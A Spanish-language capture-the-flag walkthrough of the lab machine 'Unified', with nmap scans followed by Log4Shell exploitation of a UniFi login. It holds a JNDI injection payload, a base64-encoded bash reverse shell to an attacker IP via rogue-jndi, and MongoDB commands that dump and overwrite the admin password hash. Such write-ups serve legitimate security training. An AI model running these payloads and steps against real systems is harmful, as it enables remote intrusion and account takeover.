Unified very easy

PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
6789/tcp open  ibm-db2-admin syn-ack ttl 63
8080/tcp open  http-proxy    syn-ack ttl 63
8443/tcp open  https-alt     syn-ack ttl 63
8843/tcp open  unknown       syn-ack ttl 63
8880/tcp open  cddbp-alt     syn-ack ttl 63

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Wed, 18 Sep 2024 21:02:56 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Wed, 18 Sep 2024 21:02:53 GMT
|     Connection: close
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 18 Sep 2024 21:02:56 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=9/18%Time=66EB3FFD%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8
SF:080/manage\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2018\x20Sep\x20202
SF:4\x2021:02:53\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84
SF:,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\n
SF:Content-Length:\x200\r\nDate:\x20Wed,\x2018\x20Sep\x202024\x2021:02:53\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x
SF:20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langua
SF:ge:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Wed,\x2018\x20Sep\x2020
SF:24\x2021:02:56\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>

bueno la máquina va a de explotar log4j

en este caso en el puerto 8443

https://nvd.nist.gov/vuln/detail/CVE-2021-44228

{"username":"aaaa","password":"aaaa","remember":"${jndi:ldap://10.10.x.x/whatever}","strict":true}

básicamente ponemos tcpdump en tun0 y vemos que recibimos la conexión

https://github.com/veracode-research/rogue-jndi

mvn package

ahora tenemos el jar que podemos usar

echo 'bash -c bash -i >&/dev/tcp/10.10.x.x/4455 0>&1' | base64

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTg5LzQ0NTUgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.189"

por último volvemos a ejecutar en la request interceptada lo siguiente

${jndi:ldap://10.10.x.x:1389/o=tomcat} 

script /dev/null -c bash

Y tenemos la flag de user

mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

nos va a enseñar el password de administrator codificado

con mkpasswd -m sha-512 Password1234
$6$qM7VYWx/CGVVljya$3nDZ8wk00v7cHNzfRu3cn3H2K9X1RMvFQMrOrHFSDEvVX6BeqzJmkI6NRygzmbqMy5A7bRgYLALgWoj8c7jqn/

creamos el password

y vamos a actualizarlo en bd

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$qM7VYWx/CGVVljya$3nDZ8wk00v7cHNzfRu3cn3H2K9X1RMvFQMrOrHFSDEvVX6BeqzJmkI6NRygzmbqMy5A7bRgYLALgWoj8c7jqn/"}})'

comprobamos que se actualizó

mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

pues ya tenemos acceso a la web

En setting site, bajamos y podemos ver el password de root NotACrackablePassword4U2022


Y con eso ya está hecha la máquina

Curiosamente tiene chicha la máquina, aunque es muy fácil para mi es normal, me parece que es bastante chula